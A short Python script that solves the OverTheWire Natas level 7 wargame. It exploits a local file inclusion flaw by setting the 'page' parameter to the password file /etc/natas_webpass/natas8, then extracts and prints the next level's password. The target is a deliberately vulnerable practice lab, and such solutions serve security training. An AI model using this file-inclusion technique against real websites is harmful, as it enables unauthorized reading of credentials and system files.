import re
import requests


def get_natas8_password(natas7_password):
    URL = "http://natas7.natas.labs.overthewire.org/?page=/etc/natas_webpass/natas8"
    session = requests.Session()
    session.auth = ("natas7", natas7_password)
    request = session.get(URL)
    natas8_password = re.findall(r"([a-zA-Z\d]{32})", request.text)[1]
    print("[!] The password for Natas 8 is: " + natas8_password)

    return natas8_password


if __name__ == '__main__':
    natas7_password = ""  # Put here the password for natas7 here
    get_natas8_password(natas7_password)
